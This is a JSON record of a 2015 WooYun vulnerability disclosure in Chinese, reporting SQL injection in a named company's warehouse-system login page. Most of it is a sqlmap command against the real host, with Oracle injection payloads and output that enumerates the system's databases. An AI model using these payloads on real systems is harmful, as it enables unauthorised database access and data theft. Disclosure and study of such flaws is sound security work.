{"id": 30307, "wybug_id": "wooyun-2015-0116927", "wybug_title": "飞虎乐购某管理系统SQL注射（多个系统数据库侧漏）", "wybug_corp": "飞虎乐购", "wybug_author": "Neeke", "wybug_date": "2015-05-29 15:22", "wybug_open_date": "2015-07-13 15:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 系统登录入口可SQL注射 详细说明：  系统：http://wms.efeihu.com/Login.aspx登录框用户名加个单引号试试。\n\n\n\n   漏洞证明：  ./sqlmap.py -u \"http://wms.efeihu.com/Login.aspx\" --data \"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=\"%\"2FwEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR\"%\"2FHgRu7Yy5DyiGWyrPsk05uHHF0A\"%\"3D\"%\"3D&txtUsername=admin&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=\"%\"2FwEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu\"%\"2FfTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k\"%\"2Bif8wssRQ\" -p txtUsername --batchsqlmap identified the following injection points with a total of 294 HTTP(s) requests:---Parameter: txtUsername (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 5892=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (5892=5892) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(106)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'xrdt'='xrdt&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 2297=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'csfC'='csfC&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: txtUsername (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 5892=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (5892=5892) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(106)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'xrdt'='xrdt&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 2297=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'csfC'='csfC&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oraclecurrent user:    'WTMS'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: txtUsername (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 5892=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (5892=5892) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(106)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'xrdt'='xrdt&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 2297=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'csfC'='csfC&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oraclecurrent user is DBA:    Falsesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: txtUsername (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 5892=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (5892=5892) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(106)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'xrdt'='xrdt&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTI1OTg1Njc1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUKV01TIFNZU1RFTWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQhpbWdMb2dpbgUIaW1nUmVzZXR/HgRu7Yy5DyiGWyrPsk05uHHF0A==&txtUsername=admin' AND 2297=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'csfC'='csfC&txtPassword=sfsdf&imgLogin.x=25&imgLogin.y=5&hidUserIP=&__EVENTVALIDATION=/wEWBwL83rHpAgKl1bK4CQK1qbSRCwLmu/fTBQKgqv2eBwKLrazsBwKqqNjdAxQ7dsdcWf0WwDoqE6k+if8wssRQ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oracleavailable databases [33]:[*] AMBASSADOR[*] AT[*] B2B[*] BI[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EAI[*] EDM[*] EXFSYS[*] FIN[*] MDSYS[*] MKT[*] MONITOR[*] MOP[*] OMS[*] ORDSYS[*] OUTLN[*] QUEST[*] RMA[*] SCM[*] SCM_ADMIN[*] SHIVER[*] SURVEY[*] SYS[*] SYSMAN[*] SYSTEM[*] TMS[*] TSMSYS[*] WMS[*] WTMS[*] XDB[*] XUWEIHUA   修复方案：  你说呢？   版权声明：转载请注明来源 Neeke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}